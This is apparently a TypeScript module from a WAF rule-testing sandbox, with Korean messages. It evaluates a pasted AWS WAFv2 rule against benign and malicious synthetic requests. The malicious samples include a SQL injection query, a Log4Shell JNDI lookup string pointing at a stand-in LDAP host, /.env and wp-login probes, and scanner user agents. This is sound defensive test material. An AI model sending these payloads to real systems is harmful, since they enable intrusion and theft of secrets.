import "server-only";
import { APP_TRAFFIC_PATHS } from "./config";
import { evalStatement, type EvalContext } from "./rulestatement";
import type { RuleTestResult, RuleTestRow, TestRequest } from "@/lib/types";

// User-supplied regex runs here, so every input is bounded (spec B5).
export const RULE_JSON_MAX = 20_480;
export const MAX_REQUESTS = 50;
export const FIELD_MAX = 500;

const BROWSER_UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36";

// Seeded from APP_TRAFFIC_PATHS so the set stays in step with the volumetric
// policy: one ordinary browser request per served path, the scenario's load
// generator, and the ALB health check.
export function defaultTestRequests(): TestRequest[] {
  const rows: TestRequest[] = APP_TRAFFIC_PATHS.map((p, i) => ({
    id: `app-${i}`,
    method: "GET",
    path: p,
    query: "",
    userAgent: BROWSER_UA,
    ip: "10.0.2.88",
    country: "KR",
    benign: true,
  }));
  rows.push({
    id: "loadgen",
    method: "GET",
    path: APP_TRAFFIC_PATHS[0] ?? "/v1/user",
    query: "",
    userAgent: "Go-http-client/2.0",
    ip: "10.0.2.23",
    country: "KR",
    benign: true,
  });
  rows.push({
    id: "healthcheck",
    method: "GET",
    path: "/healthcheck",
    query: "",
    userAgent: "ELB-HealthChecker/2.0",
    ip: "10.0.2.1",
    country: "KR",
    benign: true,
  });
  return rows;
}

// Deliberately malicious sample requests. Blocking any of these is the point of
// a WAF rule — the sandbox scores them as caught, not as a false positive.
export function maliciousExampleRequests(): TestRequest[] {
  return [
    { id: "mal-wplogin", method: "GET", path: "/wp-login.php", query: "", userAgent: "Mozilla/5.0", ip: "203.0.113.7", country: "CN", benign: false },
    { id: "mal-sqlmap", method: "GET", path: "/v1/user", query: "id=1%20OR%201=1", userAgent: "sqlmap/1.7", ip: "203.0.113.8", country: "RU", benign: false },
    { id: "mal-env", method: "GET", path: "/.env", query: "", userAgent: "python-requests/2.31", ip: "203.0.113.9", country: "CN", benign: false },
    { id: "mal-jndi", method: "GET", path: "/v1/user", query: "", userAgent: "${jndi:ldap://x/a}", ip: "203.0.113.10", country: "US", benign: false },
    { id: "mal-b64", method: "GET", path: "/v1/product", query: "cmd=Z2V0fHBvc3RfZGF0YV9leGZpbA==", userAgent: "Mozilla/5.0", ip: "203.0.113.11", country: "CN", benign: false },
    { id: "mal-gobuster", method: "GET", path: "/admin", query: "", userAgent: "gobuster/3.6", ip: "203.0.113.12", country: "RU", benign: false },
  ];
}

type Action = RuleTestResult["action"];

function readAction(rule: Record<string, unknown>): Action {
  const pick = (v: unknown): Action | null => {
    if (typeof v !== "object" || v === null) return null;
    const o = v as Record<string, unknown>;
    if ("Block" in o) return "Block";
    if ("Count" in o) return "Count";
    if ("Allow" in o) return "Allow";
    return null;
  };
  // A rule-group rule carries OverrideAction instead of Action.
  return pick(rule["Action"]) ?? pick(rule["OverrideAction"]) ?? "(none)";
}

function validateRequests(requests: TestRequest[]): void {
  if (requests.length === 0) throw new Error("시험할 요청이 없음 — 최소 1건 필요");
  if (requests.length > MAX_REQUESTS) {
    throw new Error(`요청이 너무 많음 (최대 ${MAX_REQUESTS}건)`);
  }
  for (const r of requests) {
    for (const [field, value] of [
      ["method", r.method],
      ["path", r.path],
      ["query", r.query],
      ["userAgent", r.userAgent],
      ["ip", r.ip],
      ["country", r.country],
    ] as const) {
      if (value.length > FIELD_MAX) {
        throw new Error(`요청 ${r.id}의 ${field}가 너무 김 (최대 ${FIELD_MAX}자)`);
      }
    }
  }
}

function parseRule(ruleJson: string): { name: string; action: Action; statement: unknown } {
  if (ruleJson.length > RULE_JSON_MAX) {
    throw new Error(`규칙 JSON이 너무 큼 (최대 ${Math.floor(RULE_JSON_MAX / 1024)}KB)`);
  }
  let parsed: unknown;
  try {
    parsed = JSON.parse(ruleJson);
  } catch (e) {
    throw new Error(`규칙 JSON 파싱 실패: ${e instanceof Error ? e.message : String(e)}`);
  }
  if (typeof parsed !== "object" || parsed === null || Array.isArray(parsed)) {
    throw new Error("규칙 JSON이 객체가 아님 — WAFv2 Rule 하나를 붙여넣어야 함");
  }
  const rule = parsed as Record<string, unknown>;
  if (!("Statement" in rule)) {
    throw new Error("규칙에 Statement가 없음 — WAFv2 Rule 형식이 아님");
  }
  return {
    name: typeof rule["Name"] === "string" ? rule["Name"] : "(이름 없음)",
    action: readAction(rule),
    statement: rule["Statement"],
  };
}

function outcomeFor(
  matched: boolean | null,
  action: Action,
  benign: boolean,
): { outcome: RuleTestRow["outcome"]; reason: string } {
  if (matched === null) {
    return { outcome: "UNKNOWN", reason: "규칙을 로컬에서 평가할 수 없음 — 미지원 문법 포함" };
  }
  if (!matched) {
    return benign
      ? { outcome: "PASS", reason: "정상 요청이 규칙에 매칭되지 않음 — 통과" }
      : { outcome: "PASS", reason: "악성 예시가 규칙에 걸리지 않음 — 미탐(놓침)" };
  }
  switch (action) {
    case "Block":
      return benign
        ? { outcome: "BLOCKED", reason: "정상 요청이 매칭되고 Block — 오탐 위험" }
        : { outcome: "CAUGHT", reason: "악성 예시가 매칭되고 Block — 정탐(차단)" };
    case "Count":
      return { outcome: "COUNTED", reason: "매칭되지만 Action이 Count — 차단되지 않고 계측만" };
    case "Allow":
      return { outcome: "PASS", reason: "규칙에 매칭되고 Action이 Allow — 통과" };
    default:
      return { outcome: "UNKNOWN", reason: "매칭되지만 Action이 없어 차단 여부를 알 수 없음" };
  }
}

export function testRule(params: { ruleJson: string; requests: TestRequest[] }): RuleTestResult {
  validateRequests(params.requests);
  const { name, action, statement } = parseRule(params.ruleJson);

  const ctx: EvalContext = { unsupported: new Set(), notes: new Set() };
  const rows: RuleTestRow[] = params.requests.map((req) => {
    const v = evalStatement(statement, req, ctx);
    const matched = v === "UNKNOWN" ? null : v;
    const { outcome, reason } = outcomeFor(matched, action, req.benign);
    return { requestId: req.id, matched, outcome, reason };
  });

  const count = (o: RuleTestRow["outcome"]): number => rows.filter((r) => r.outcome === o).length;
  const blocked = count("BLOCKED");
  const unknown = count("UNKNOWN");
  const caught = count("CAUGHT");
  const byId = new Map(params.requests.map((r) => [r.id, r]));
  const missed = rows.filter(
    (r) => byId.get(r.requestId)?.benign === false && r.outcome !== "CAUGHT" && r.outcome !== "UNKNOWN",
  ).length;

  const notes = [...ctx.notes];
  if (ctx.unsupported.size > 0) {
    notes.push(
      `로컬에서 평가할 수 없는 문법: ${[...ctx.unsupported].join(", ")} — 해당 요청은 판정 불가로 표시됨`,
    );
  }
  if (action === "Count") {
    notes.push("COUNT 모드 — 매칭돼도 실제 차단은 발생하지 않음");
  }
  notes.push("합성 요청에 대한 로컬 평가 결과 — 실제 적용 전 COUNT로 검증 필요");
  if (caught > 0) notes.push(`악성 예시 ${caught}건 차단(정탐)`);
  if (missed > 0) notes.push(`악성 예시 ${missed}건이 규칙을 통과함(미탐) — 규칙이 공격을 놓침`);

  return {
    ruleName: name,
    action,
    unsupported: [...ctx.unsupported],
    rows,
    passed: count("PASS"),
    blocked,
    counted: count("COUNTED"),
    caught,
    missed,
    unknown,
    // Only a blocked *benign* request is a false positive; caught malicious
    // traffic is the goal, not a risk.
    verdict: blocked > 0 ? "FALSE_POSITIVE_RISK" : unknown > 0 ? "INCONCLUSIVE" : "SAFE",
    notes,
  };
}
